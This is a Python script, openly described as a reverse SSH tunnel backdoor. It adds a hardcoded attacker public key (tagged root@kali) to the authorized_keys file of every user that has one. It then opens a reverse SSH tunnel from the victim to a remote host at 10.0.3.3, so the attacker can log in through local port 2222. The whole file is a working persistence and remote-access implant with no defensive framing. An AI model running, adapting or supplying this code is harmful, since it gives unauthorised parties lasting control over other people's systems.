#!/usr/bin/env python3
import subprocess
import os

"""
Python reverse SSH tunnel backdoor, assumes ssh client is installed
To login to an interactive session, from host run:
ssh -p 2222 localhost
"""

# REMOTE host info
remote_host = "root@10.0.3.3"
remote_pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiT3CUOpPXc/vIXm3KPrv+oTtfDvIqUQqOhFSpV238iGs3z6evB0tdsxskk" \
         "1arU/dnuevEdzfLUiM5NsV6ijkPqCpYf+VXmtfQrxzFUBNpFaCwuXVsuI2+bO+rzArwMQKTWfdqQG4B5yVYPNodJgKSDim" \
         "M5RDsKzE9nQ6WWrBiyNVAcdOQh7aiIsKjwBO5n9GWHgiEPR2JzQWDVGvG49SKiwPvn8t/t4Jb7HViiWH1MTgxIiYDHBU2HK" \
         "RcUhXcHuJuh7kWkZaFm287lx+ciz72HHb1aTclU8joDjWLxV49D/9dNUB37jag0ajrF35Nl1iiPKh5ew+yFMFMz7mxtyb" \
         "x+qbCascelvIIylvJAf+j4MKnQaPUEV9SziVH+8Cd83HClvKkT4MOEFDa2lunxokvYmxXGevFpsiGzPbsdy0R6h2y" \
         "oVqAGRlI3/GCTRi5OVXs3Ma4tW2RfHQspY1D40Gt8gnfqxcK/SN0GkDJ8JBxTHkYPPRaw8DandXeUSj+8tJM5TebN" \
         "w2XeODYpWIw02i3KtYi/POSKh5p5tydXLPvXHL3uSZOOm9ZQdNL/yELLx93rbI6doEnTutmjN0WOz5sezJbdXXZn" \
         "0hZJNUxYo8qc9hW7yJ4VnznsE5lpCL10AnIMuf1L57QKfpKmpBZSAevM6PhrBrLxvMKRKWc+nJvBQ== root@kali"

# Both below must also be present on REMOTE host
# LOCAL host info
# privkey = "/home/dylan/.ssh/id_rsa"
privkey = "privkey.txt"
pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDyG9u90SVwZuZIKug1SmczL4UjFA4RmGYeHy0JGKBvP2Uf3sF/Z" \
         "id82JDvh0vnPdiHJSF+F26QEYcLBkji/MJMnmqEwvVlXxB7vHezdlndRaGdhzV5ealv16qDngHu0EaAZS6e1JQvT54lK" \
         "VsyQU9L0HQvRCGDa2fP+LNy4HNlDvuTJTGAONTh0vqKrtvTjJxcMj/cRTUzt5DHNwWOkhwtwuwRhBRAy/4Z1ZO0NDg/nU/Fn" \
         "OSzBwv1PH1b61AJ7B/IzLxVQGd/Ld5EHigLbKPMRkY8X6YGumgt324q3bnfAiwqnnO/+I79WDRDuIYQWZMN4wB3DW5YfI6QT" \
         "oJ5Mp9Ib1zIr+thbAdNqgIrn65XVXwnJV1Pmi8PhNZPdBv4biYV4RLZI+cxvm5W7KyCLMOd6OrwST25U2KkXRFk60Cw67J5qXU" \
         "vfuw1h1n16UI0bXaZ2qjFhh499IjznJ93NugWiuZIQKl9DfMb4Lo5y4HKJ+Eokjh7YlJftCfPYOywUwnZe/pbW7ckUXrfAgyhTv3" \
         "tL/nlfC48pkmAUWo5ir85j4jwWvcJ1d5BITME33GGTTZeeNlOQGMji1Q4LFJks952xnjGOvMxQQlLkmpPw6Vk0WK/avlAB/BgNkTqg" \
         "tEU6QQ81LC7VC3m6+d9LOXmorCv6FAcxw5pgbxsh4FCNx59qQ== dylan@dylan-Inspiron-7386"

# Check if host has an ssh client installed
if subprocess.check_output(["which", "ssh"]):
    print("SSH exists")
else:
    print("Host doesn't have an ssh client")
    exit(1)

# List every user with a home directory
for user in os.listdir("/home/"):
    print("User found: {}".format(user))

    # Check if user has a .ssh directory
    if os.path.exists("/home/"+user+"/.ssh/"):
        print("{} has a .ssh directory".format(user))

        # Check if user has an authorized_keys file
        if os.path.exists("/home/"+user+"/.ssh/authorized_keys"):
            print("{} has an authorized_keys file")

            # Check if remote_pubkey already exists in authorized_keys
            with open("/home/"+user+"/.ssh/authorized_keys", "r") as f:
                if remote_pubkey in f.read():
                    print("Key already exists in host's authorized keys")
                else:
                    # Add host's pubkey to .ssh/authorized_keys
                    subprocess.run("echo "+remote_pubkey+" >> /home/"+user+"/.ssh/authorized_keys", shell=True)

            # Initiate reverse tunnel to host
            print("Starting SSH tunnel")
            ssh = subprocess.run(["ssh", "-TN", "-i", privkey, "-R", "2222:localhost:22", remote_host])  # -fTN #
    else:
        continue
